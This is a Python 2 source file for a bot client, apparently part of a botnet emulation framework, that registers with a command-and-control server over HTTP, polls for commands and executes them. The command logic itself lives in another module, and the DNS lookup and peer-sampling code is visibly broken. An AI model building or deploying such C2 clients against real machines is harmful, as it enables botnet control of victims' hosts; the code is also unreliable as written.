#!/usr/bin/env python2
# coding=UTF-8
import json, logging, random, requests

from actors import BotCommands
from actors.AbstractBot import CommandExecutor
from resources import emu_config
from utils.LogfileParser import writeLogentry


def requestIP(nameserverIP):
    dnsresolver.query("cncserver", "A")


class Bot(CommandExecutor):
    """Implements a bot that, in regular intervals, fetches commands from the given CnC-Server
    and renews its registration with said server. The possible commands are defined in BotCommands.py."""

    def __init__(self, peerlist=[], **kwargs):
        super(Bot, self).__init__(**kwargs)
        self.current_command = None
        self.threads = []
        self.peerlist = peerlist

    def performDuty(self):
        logging.debug("Doing duties")

        # If there is a CnC-Server in the current_peerlist
        if len(self.peerlist) > 0:
            try:
                nameserverIP = random.sample(self.peerlist)[0]
                cncserverIP = requestIP(nameserverIP)
                self._registerWithCnCServer(cncserverIP)
                self.current_command = BotCommands.fetchCurrentCommand(cncserverIP, self.current_command)
                if self.current_command is not None:
                    self._executeCurrentCommand()
            except Exception as ex:
                logging.debug("Duty of bot %s failed with %s: %s" % (self.name, type(ex).__name__, ex))

    def _executeCurrentCommand(self):
        """Executes the last command that has been fetched from the CnC-Server"""

        if isinstance(self.current_command, dict) and self.current_command.has_key("command") \
                and self.current_command["command"] != "":
            try:
                writeLogentry(runnable=type(self).__name__, message="received_command: %s"
                                                                    %json.dumps(
                    {"bot": self.name, "newcmd": self.current_command}))
                BotCommands.executeCurrentCommand(self.current_command)
            except TypeError as ex:
                logging.warning("Command %s got invalid parameters %s: %s"
                                % (self.current_command["command"], self.current_command["kwargs"], ex.message))

    def _registerWithCnCServer(self, cncserver):
        """Notifies the CnC-Server that this bot exists and is still operational."""

        response = requests.post("http://%s:%s/register" % (cncserver, emu_config.PORT),
                                 data={'id': self.name})
        if not response.text == "OK":
            logging.debug(
                "Registration of bot %s failed with %s: %s" % (self.name, response.status_code, response.text))
